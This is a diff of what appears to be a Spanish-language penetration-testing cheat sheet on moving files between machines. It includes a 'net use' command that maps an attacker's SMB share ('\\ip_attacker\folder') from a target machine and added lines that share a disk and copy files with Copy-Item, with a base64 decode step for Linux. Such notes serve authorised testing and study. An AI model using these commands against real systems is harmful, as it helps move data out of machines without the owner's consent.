@@ -52,6 +52,12 @@ net use n: \\ip_attacker\folder /user:test test
 #Me conecto mediante las credenciales necesarias y defino a n como la ip y el folder creado
 #net use conecta oa desconecta una computadora en un recurso comártido. Asignamos a la letra n el recurso compartido \\ip\folder
 #el /user puede no usarse en caso de no requerir
+
+net use * \\<host>\<disco> /user:/<domain>\<user>
+#Estando en la maquina objetivo, puedo compartir el disco especificado
+Copy-Item <path_from> <path_to>
+#Copiamos de un disco a otro disco 
+
 ---     Download to linux       ---
     Base64
 echo 'base64_string | base64 -d > output_file'
